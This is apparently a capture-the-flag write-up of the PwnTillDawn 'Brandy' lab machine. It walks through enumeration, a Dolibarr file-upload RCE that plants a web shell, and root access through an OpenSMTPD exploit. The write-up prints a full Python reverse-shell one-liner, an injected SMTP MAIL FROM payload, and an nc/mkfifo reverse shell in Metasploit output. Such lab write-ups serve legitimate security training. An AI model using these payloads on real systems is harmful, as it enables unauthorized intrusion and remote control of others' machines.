---
title: "PwnTillDawn - Brandy"
author: Nasrallah
description: ""
date: 2025-03-19 07:00:00 +0000
categories : [PwnTillDawn]
tags: [pwntilldawn, linux, easy]
img_path: /assets/img/pwntilldawn/brandy
image:
    path: brandy.png
---

---

[Brandy](https://online.pwntilldawn.com/Target/Show/42) from [PwnTillDawn](https://online.pwntilldawn.com/) is a linux box rated difficult. The machine is running a vulnerable version of `dolibarr` allowing for file upload and leading to RCE which gave us a foothold to the machine, After that we find an smtp server running locally which is also vulnerable to an RCE, we forward the port and use a metasploit module to get root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.150.150.27     
Host is up (0.092s latency).                                                                   
Not shown: 998 closed tcp ports (reset)        
PORT   STATE SERVICE VERSION                                                                   
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)              
| ssh-hostkey:                                 
|   2048 45:66:62:34:f1:21:bf:8b:43:18:fb:24:a7:f3:29:76 (RSA)
|   256 1c:2a:2e:e4:e8:ea:cc:ec:a5:c4:44:d0:18:75:24:34 (ECDSA)                                
|_  256 24:1a:99:37:27:53:a4:ce:0e:30:d4:14:d0:68:df:2b (ED25519)                              
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))     
|_http-title: Apache2 Ubuntu Default Page: It works        
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 is Openssh running on Ubuntu and port 80 is Apache also running on Ubuntu

### Web

Let's navigate to the website.

![default](1.png)

It shows the default page for Apache, let's run a directory scan.

```terminal

eroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.150.150.27 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.150.150.27
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6147c http://10.150.150.27/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.150.150.27/
301      GET        9l       28w      313c http://10.150.150.27/cart => http://10.150.150.27/cart/
301      GET        9l       28w      315c http://10.150.150.27/master => http://10.150.150.27/master/
[####################] - 71s    20484/20484   0s      found:4       errors:0      
[####################] - 71s    20477/20477   289/s   http://10.150.150.27/ 
```

We managed to find two directories; `cart` and `master`.

![cart](2.png)

The cart page reveals the vhost `crm.pwntilldawn.com`, so let's add that to our `/etc/hosts` file.

![master](3.png)

The master page show an image that says the name `rick` is used everywhere.

#### crm.pwntilldawn.com

Let's navigate to the vhost.

![vhost](4.png)

This gives us a login page for `Dolibarr 5.0.3`

Let's try login in using `rick` as a username and password.

![dashboard](5.png)

The credentials worked and we managed to login with `rick:rick`.

## **Foothold**

Searching for possible exploits on `dolibarr` we come across a `File upload restrictions bypass` leading to `Remote Code Execution`. The exploit can be found [here](https://www.exploit-db.com/exploits/49711)

We download the exploit and run it.

```bash
$ python exploit.py -c id -u rick -p rick http://crm.pwntilldawn.com
Successful login, user id found: 2                                                             
------------------------------
Trying extension-bypass method
                                                                                               
Error 404 http://crm.pwntilldawn.com/documents/users/2/jb9mmla9.php?cmd=id
Non-executable http://crm.pwntilldawn.com/documents/users/2/jb9mmla9.pht?cmd=id
Error 404 http://crm.pwntilldawn.com/documents/users/2/jb9mmla9.phpt?cmd=id
Payload was successful! http://crm.pwntilldawn.com/documents/users/2/jb9mmla9.phar?cmd=id
Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It worked and we managed to run commands.

The exploit uploaded a php web shell to the target and from there it executed commands using `cmd` parameter.

Multiple URLs were provided, let's choose a one that works and run a python reverse shell command.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.66.67.114",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

I just copied the url to my browser and instead of running the `id` command I run the above rev shell command.

```bash
http://crm.pwntilldawn.com/documents/users/2/jb9mmla9.phar?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.66.67.114",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

After setting up the listener we receive a shell as user `www-data`

```terminal
┌──[10.66.67.114]─[sirius💀parrot]-[~/…/htb/dog/scans/shell]
└──╼[★]$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.66.67.114] from (UNKNOWN) [10.150.150.27] 44992
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Brandy:/var/www/html/dolibarr/documents/users/2$ export TERM=xterm
export TERM=xterm
www-data@Brandy:/var/www/html/dolibarr/documents/users/2$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                 
┌──[10.66.67.114]─[sirius💀parrot]-[~/…/htb/dog/scans/shell]
└──╼[★]$ stty raw -echo;fg                          
[1]  + continued  nc -lvnp 9001

www-data@Brandy:/var/www/html/dolibarr/documents/users/2$ 

```

## **Privilege Escalation**

Checking the listening ports using `netstat -tulpn` we find something very interesting.

```terminal
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Port 25 is listening locally.

Let's connect to that port and do some enumeration.

```terminal
www-data@Brandy:/home$ nc 127.0.0.1 25                                                          
220 Brandy ESMTP 

```

The smtp server is `OpenSMTPD`.

Searching for possible exploits on google we find a module on metasploit called `exploit/unix/smtp/opensmtpd_mail_from_rce` which exploits an RCE vulnerability on the `OpenSMTPD` server.

Before we start the exploitation we need to forward the 25 port first.

### Chisel

I'll be using `chisel` for the forwarding part.

First we start a server on our machine using the following command.

```bash
./chisel server --reverse --port 9999
```

After uploading a copy of the binary we need to connect to our server using the following command.

```bash
./chisel client 10.66.67.114:9999 R:8888:localhost:25
```

![chisel](6.png)

Now that everything is setup let's fire up metasploit, fill the options of the module and run it.

```terminal
[msf](Jobs:0 Agents:1) exploit(unix/local/opensmtpd_oob_read_lpe) >> set lhost tun0
[msf](Jobs:0 Agents:1) exploit(unix/local/opensmtpd_oob_read_lpe) >> rhosts 127.0.0.1
[msf](Jobs:0 Agents:1) exploit(unix/local/opensmtpd_oob_read_lpe) >> set rport 8.8.8.8
[msf](Jobs:0 Agents:1) exploit(unix/smtp/opensmtpd_mail_from_rce) >> run                                                                                                             [188/717]
[*] Started reverse TCP handler on 10.66.67.114:4444             
[*] 127.0.0.1:8888 - Running automatic check ("set AutoCheck false" to disable)
[!] 127.0.0.1:8888 - The service is running, but could not be validated.                       
[*] 127.0.0.1:8888 - Connecting to OpenSMTPD                                                   
[*] 127.0.0.1:8888 - Saying hello and sending exploit                                          
[*] 127.0.0.1:8888 - Expecting: /220.*OpenSMTPD/                                               
[*] 127.0.0.1:8888 - Sending: HELO 4VjeYCOD56t6QoUq1VnvbJlc8                                   
[*] 127.0.0.1:8888 - Expecting: /250.*pleased to meet you/                                     
[*] 127.0.0.1:8888 - Sending: MAIL FROM:<;for d in x c S 4 a e F A 9 G J K w y;do read d;done;sh;exit 0;>                                    
[*] 127.0.0.1:8888 - Expecting: /250.*Ok/                                                      
[*] 127.0.0.1:8888 - Sending: RCPT TO:<root>                                                                                                                                                  
[*] 127.0.0.1:8888 - Expecting: /250.*Recipient ok/                                            
[*] 127.0.0.1:8888 - Sending: DATA                                                             
[*] 127.0.0.1:8888 - Expecting: /354 Enter mail.*itself/                                       
[*] 127.0.0.1:8888 - Sending: 
#
#
#
#
#
#
#
#
#
#
#
#
#
#
mkfifo /tmp/tbzlnn; nc 10.66.67.114 4444 0</tmp/tbzlnn | /bin/sh >/tmp/tbzlnn 2>&1; rm /tmp/tbzlnn
[*] 127.0.0.1:8888 - Sending: .
[*] 127.0.0.1:8888 - Expecting: /250.*Message accepted for delivery/
[*] 127.0.0.1:8888 - Sending: QUIT
[*] 127.0.0.1:8888 - Expecting: /221.*Bye/
[*] Command shell session 3 opened (10.66.67.114:4444 -> 10.150.150.27:37934) at 2025-03-18 14:50:05 +0000
id
uid=0(root) gid=0(root) groups=0(root)
```

And just like that we have rooted this machine.

## **References**

<https://www.exploit-db.com/exploits/48038>

<https://www.exploit-db.com/exploits/49711>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
